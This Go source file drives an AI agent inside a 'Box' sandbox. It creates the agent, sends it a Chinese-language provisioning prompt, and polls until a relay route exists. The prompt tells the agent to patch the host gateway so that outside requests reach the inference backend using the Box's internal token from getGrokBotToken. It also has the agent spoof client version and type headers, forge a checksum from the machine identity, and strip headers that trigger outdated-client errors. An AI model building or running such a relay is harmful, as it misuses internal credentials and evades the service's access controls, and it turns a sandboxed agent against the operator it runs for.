package executor

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/router-for-me/cursor-proto/auth"
)

const boxRelayProvisionPrompt = `请为当前 Box 幂等安装或升级 Cursor Sand Stream relay。开始前先检查
/home/box/sand-host/host-main.cjs：如果已经存在唯一 POST 路由
/sand-stream-relay/aiserver.v1.InferenceService/Stream，不要重复添加路由，但要
审计并原地更新现有 handler，使其满足下面全部要求。

若路由不存在：先备份将修改的文件；在现有 host gateway HTTP 服务的
handleRequest 中增加该唯一 POST 路由，并复用现有 isAuthorized /
SAND_GATEWAY_TOKEN 鉴权。原样接收 application/connect+proto 请求体并保持
流式转发、背压和客户端中止。转发到 backendUrl 的
/aiserver.v1.InferenceService/Stream；丢弃客户端 Authorization，调用 Box
内现有 getGrokBotToken 或 credential store 获取短期 token 后写入 Bearer；
按 Box 内当前可工作的 Sand backend 配置设置 headers：
x-cursor-client-type=sand、x-cursor-client-version=0.46.0、
x-sand-box-namespace=prod、x-ghost-mode=true，并用 Box 的 service machine identity
生成 x-cursor-checksum。明确删除 x-cursor-client-source、x-cursor-config-version 和
x-cursor-client-commit；不要替换成 Cursor IDE 的 3.x 版本。
不修改 model request，不定义模型列表。v6 曾把已工作的 v5 流处理改为原样转发，
导致真实模型请求一直等待且拿不到响应头；请从 v6 前的备份或现有实现中恢复 v5
已验证过的流式生命周期，禁止先缓存或 await 完整 response body。向 backend 发请求
前删除客户端的 connect-accept-encoding 与普通 HTTP accept-encoding，明确请求
identity，避免改变已经验证过的上游行为。

请求体必须继续原样流式转发。若客户端请求头 connect-content-encoding 为 gzip，
必须向 backend 显式设置 connect-content-encoding: gzip；不得保留压缩 frame 的
0x01 标志却删除该请求头。若该头缺失则不要凭空添加；若为其他未知编码则返回明确
错误，不要把无法解码的请求发给 backend。connect-accept-encoding 仍按上一段删除，
它控制的是响应协商，与请求侧 connect-content-encoding 不是一回事。

响应继续使用 v5 的 Node Transform：按 5-byte Connect envelope（1-byte flags +
4-byte big-endian length）跨 chunk 缓冲并逐帧解析；对 flags & 0x01 的 data frame，
用 zlib.gunzipSync 解压 payload、清除 0x01 压缩位并按解压后的 payload 重写长度；
未压缩 data frame 与 end frame 原样输出。流结束时若仍有不完整 frame 必须报错并
中止，保留背压与客户端 abort。

唯一新增的兼容要求：在真实 Stream handler 写下游响应头之前，无条件强制设置
Connect-Content-Encoding: gzip，即使 Transform 最终输出的 frame 都未压缩也要设置；
Connect 客户端只在 frame 压缩位为 1 时调用解压器，所以混合/identity frame 安全。
禁止删除该头，不要只改 status 返回值而不改真实 Stream handler。删除普通 HTTP 的
content-encoding 和 content-length，其他 Connect 关键响应头、HTTP 状态及 end frame
必须保留。收到上游响应头后立即写下游响应头并开始 pipe，不能等流结束。
不要打印、返回、保存或暴露任何 token/credential、checksum、请求正文或原始
protobuf body。

同时提供受同一 gateway 鉴权保护的 GET /sand-stream-relay/status，返回 JSON：
routeVersion=v8、upstreamClientVersion=0.46.0、configVersionMode=strip、
requestCompression=gzip-forwarded、responseCompression=gzip-declared，并用
diagnosis/result 描述非敏感的最终校验结果。

完成后按当前 Box 的标准方式重启 sand host，并做不含真实生成内容的空
Connect 路由健康检查；除预期的缺少请求字段错误外，必须确认不再返回
ERROR_OUTDATED_CLIENT。若无法安全确认上述状态，停止修改并明确报告原因。`

func (c *Client) probeBoxRelay(ctx context.Context, req *ChatRequest) (int, error) {
	if req == nil || req.BoxRelayURL == "" || req.BoxToken == "" {
		return 0, fmt.Errorf("box relay probe needs url and token")
	}
	url := strings.TrimRight(req.BoxRelayURL, "/") + sandRelayStatusPath
	httpReq, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+req.BoxToken)
	if req.BoxNetworkToken != "" {
		httpReq.Header.Set("x-anyrun-network-token", req.BoxNetworkToken)
	}
	resp, err := c.HTTP.Do(httpReq)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode, nil
}

func (c *Client) provisionBoxRelay(ctx context.Context, req *ChatRequest) error {
	if req == nil || req.BoxRelayURL == "" || req.BoxToken == "" {
		return fmt.Errorf("provision needs a minted box")
	}
	events, err := c.openBoxEvents(ctx, req)
	if err == nil && events != nil {
		defer events.Close()
	}
	agentID, err := c.createBoxRelayAgent(ctx, req)
	if err != nil {
		return err
	}
	if err := c.sendBoxProvisionPrompt(ctx, req, agentID); err != nil {
		return err
	}
	deadline := time.Now().Add(180 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(5 * time.Second):
		}
		status, err := c.probeBoxRelay(ctx, req)
		if err == nil && status == http.StatusOK {
			return nil
		}
	}
	return fmt.Errorf("box relay still missing after provision (agent %s)", agentID)
}

func (c *Client) boxGatewayRequest(ctx context.Context, req *ChatRequest, method, path string, body []byte) (*http.Response, error) {
	url := strings.TrimRight(req.BoxRelayURL, "/") + path
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}
	httpReq, err := http.NewRequestWithContext(ctx, method, url, reader)
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+req.BoxToken)
	if req.BoxNetworkToken != "" {
		httpReq.Header.Set("x-anyrun-network-token", req.BoxNetworkToken)
	}
	httpReq.Header.Set("x-sand-slim-avatars", "1")
	if body != nil {
		httpReq.Header.Set("Content-Type", "application/json")
	}
	return c.HTTP.Do(httpReq)
}

func (c *Client) openBoxEvents(ctx context.Context, req *ChatRequest) (io.ReadCloser, error) {
	resp, err := c.boxGatewayRequest(ctx, req, http.MethodGet, "/events", nil)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		resp.Body.Close()
		return nil, fmt.Errorf("box /events HTTP %d", resp.StatusCode)
	}
	return resp.Body, nil
}

func (c *Client) createBoxRelayAgent(ctx context.Context, req *ChatRequest) (string, error) {
	payload, err := json.Marshal(map[string]any{
		"name":                     "Cursor Sand Relay",
		"description":              "Hosts the Cursor Sand Stream relay route.",
		"creationRoute":            map[string]string{"kind": "box"},
		"harness":                  "box",
		"isIntroductionSuppressed": true,
		"isKickstartRequested":     false,
		"clientNonce":              auth.GenerateRequestID(),
		"supportsTemporalHarness":  true,
	})
	if err != nil {
		return "", err
	}
	resp, err := c.boxGatewayRequest(ctx, req, http.MethodPost, "/api/createAgent", payload)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", fmt.Errorf("createAgent HTTP %d: %s", resp.StatusCode, truncate(raw, 240))
	}
	id := findJSONString(raw, "agentId", "id")
	if id == "" {
		return "", fmt.Errorf("createAgent missing agent id: %s", truncate(raw, 240))
	}
	return id, nil
}

func (c *Client) sendBoxProvisionPrompt(ctx context.Context, req *ChatRequest, agentID string) error {
	payload, err := json.Marshal(map[string]any{
		"prompt":      boxRelayProvisionPrompt,
		"agentId":     agentID,
		"clientNonce": auth.GenerateRequestID(),
		"source":      "desktop",
		"sessionId":   "",
	})
	if err != nil {
		return err
	}
	resp, err := c.boxGatewayRequest(ctx, req, http.MethodPost, "/api/sendPrompt", payload)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("sendPrompt HTTP %d: %s", resp.StatusCode, truncate(raw, 240))
	}
	var parsed map[string]any
	if err := json.Unmarshal(raw, &parsed); err != nil {
		return fmt.Errorf("sendPrompt decode: %w", err)
	}
	if accepted, _ := parsed["accepted"].(bool); !accepted {
		return fmt.Errorf("sendPrompt not accepted")
	}
	return nil
}

func findJSONString(raw []byte, keys ...string) string {
	var value any
	if err := json.Unmarshal(raw, &value); err != nil {
		return ""
	}
	want := map[string]struct{}{}
	for _, key := range keys {
		want[key] = struct{}{}
	}
	var walk func(any) string
	walk = func(node any) string {
		switch typed := node.(type) {
		case map[string]any:
			for key, item := range typed {
				if _, ok := want[key]; ok {
					if s, ok := item.(string); ok && strings.TrimSpace(s) != "" {
						return s
					}
				}
				if found := walk(item); found != "" {
					return found
				}
			}
		case []any:
			for _, item := range typed {
				if found := walk(item); found != "" {
					return found
				}
			}
		}
		return ""
	}
	return walk(value)
}

func truncate(raw []byte, n int) string {
	s := string(raw)
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func isBoxRelayMissing(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "http 404") || strings.Contains(msg, "/sand-stream-relay") && strings.Contains(msg, "not found")
}
